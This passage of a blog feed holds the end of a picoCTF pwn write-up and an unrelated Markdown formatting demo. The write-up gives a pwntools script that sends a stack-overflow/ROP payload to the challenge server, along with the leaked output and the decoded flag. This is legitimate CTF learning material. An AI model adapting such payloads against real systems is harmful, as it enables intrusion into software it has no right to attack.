<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">51157</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0804900e</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'cccc'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049DA0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049E20</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'gets you the flag</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>

<span class="c1"># b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f', 
# b'Names of user: 0x50755f4e 0x34656c43 0x7b465443', 
# b'Age of user: 0x6f636970'
</span>
<span class="c1"># little endian
</span><span class="n">str_li</span> <span class="o">=</span> <span class="p">[</span><span class="s">'7d'</span><span class="p">,</span> <span class="s">'61333337'</span><span class="p">,</span><span class="s">'31646239'</span><span class="p">,</span><span class="s">'5f597230'</span><span class="p">,</span><span class="s">'6d334d5f'</span><span class="p">,</span><span class="s">'50755f4e'</span><span class="p">,</span><span class="s">'34656c43'</span><span class="p">,</span><span class="s">'7b465443'</span><span class="p">,</span><span class="s">'6f636970'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x7d</span><span class="p">))</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">str_li</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="n">ch_l</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="result-3">Result</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f\n'
b'Names of user: 0x50755f4e 0x34656c43 0x7b465443\n'
b'Age of user: 0x6f636970\n'
...
}a3371db9_Yr0m3M_Pu_N4elC{FTC
}a3371db9_Yr0m3M_Pu_N4elC{FTCo
}a3371db9_Yr0m3M_Pu_N4elC{FTCoc
}a3371db9_Yr0m3M_Pu_N4elC{FTCoci
}a3371db9_Yr0m3M_Pu_N4elC{FTCocip
picoCTF{Cle4N_uP_M3m0rY_9bd1733a}
</code></pre></div></div>

<h2 id="reference">Reference</h2>

<ul>
  <li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">Stack Overflow</a></li>
  <li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">Basic Rop</a></li>
  <li>
    <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">Format String</a></p>

  </li>
</ul>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="pwn" /><category term="stack overflow" /><category term="fmt" /><category term="rop" /><summary type="html"><![CDATA[basic-file-exploit]]></summary></entry><entry><title type="html">An exhibit of Markdown</title><link href="http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown.html" rel="alternate" type="text/html" title="An exhibit of Markdown" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown</id><content type="html" xml:base="http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown.html"><![CDATA[<p>This note demonstrates some of what <a href="http://daringfireball.net/projects/markdown/">Markdown</a> is capable of doing.</p>

<h2 id="an-exhibit-of-markdown">An exhibit of Markdown</h2>

<p><em>Note: Feel free to play with this page. Unlike regular notes, this doesn‚Äôt automatically save itself.</em></p>

<h2 id="basic-formatting">Basic formatting</h2>

<p>Paragraphs can be written like so. A paragraph is the basic block of Markdown. A paragraph is what text will turn into when there is no reason it should become anything else.</p>

<p>Paragraphs must be separated by a blank line. Basic formatting of <em>italics</em> and <strong>bold</strong> is supported. This <em>can be <strong>nested</strong> like</em> so.</p>

<h2 id="lists">Lists</h2>

<h3 id="ordered-list">Ordered list</h3>

<ol>
  <li>Item 1</li>
  <li>A second item</li>
  <li>Number 3</li>
  <li>‚Ö£</li>
</ol>

<p><em>Note: the fourth item uses the Unicode character for <a href="http://www.fileformat.info/info/unicode/char/2163/index.htm">Roman numeral four</a>.</em></p>

<h3 id="unordered-list">Unordered list</h3>

<ul>
  <li>An item</li>
  <li>Another item</li>
  <li>Yet another item</li>
  <li>And there‚Äôs more‚Ä¶</li>
</ul>

<h2 id="paragraph-modifiers">Paragraph modifiers</h2>

<h3 id="code-block">Code block</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Code blocks are very useful for developers and other people who look at code or other things that are written in plain text. As you can see, it uses a fixed-width font.
</code></pre></div></div>

<p>You can also make <code class="language-plaintext highlighter-rouge">inline code</code> to add code into other things.</p>

<h3 id="quote">Quote</h3>

<blockquote>
  <p>Here is a quote. What this is should be self explanatory. Quotes are automatically indented when they are used.</p>
</blockquote>

<h2 id="headings">Headings</h2>

<p>There are six levels of headings. They correspond with the six levels of HTML headings. You‚Äôve probably noticed them already in the page. Each level down uses one more hash character.</p>

<h3 id="headings-can-also-contain-formatting">Headings <em>can</em> also contain <strong>formatting</strong></h3>

<h3 id="they-can-even-contain-inline-code">They can even contain <code class="language-plaintext highlighter-rouge">inline code</code></h3>

<p>Of course, demonstrating what headings look like messes up the structure of the page.</p>

<p>I don‚Äôt recommend using more than three or four levels of headings here, because, when you‚Äôre smallest heading isn‚Äôt too small, and you‚Äôre largest heading isn‚Äôt too big, and you want each size up to look noticeably larger and more important, there there are only so many sizes that you can use.</p>

<h2 id="urls">URLs</h2>

<p>URLs can be made in a handful of ways:</p>

<ul>
  <li>A named link to <a href="http://www.markitdown.net/">MarkItDown</a>. The easiest way to do these is to select what you want to make a link and hit <code class="language-plaintext highlighter-rouge">Ctrl+L</code>.</li>
  <li>Another named link to <a href="http://www.markitdown.net/">MarkItDown</a></li>
  <li>Sometimes you just want a URL like <a href="http://www.markitdown.net/">http://www.markitdown.net/</a>.</li>
</ul>

<h2 id="horizontal-rule">Horizontal rule</h2>

<p>A horizontal rule is a line that goes across the middle of the page.</p>

<hr />

<p>It‚Äôs sometimes handy for breaking things up.</p>

<h2 id="images">Images</h2>

<p>Markdown can also contain images. I‚Äôll need to add something here sometime.</p>

<h2 id="finally">Finally</h2>

<p>There‚Äôs actually a lot more to Markdown than this. See the official <a href="http://daringfireball.net/projects/markdown/basics">introduction</a> and <a href="http://daringfireball.net/projects/markdown/syntax">syntax</a> for more information. However, be aware that this is not using the official implementation, and this might work subtly differently in some of the little things.</p>]]></content><author><name>huyinhao</name></author><category term="markdown" /><category term="markdown" /><summary type="html"><![CDATA[This note demonstrates some of what Markdown is capable of doing.]]></summary></entry></feed>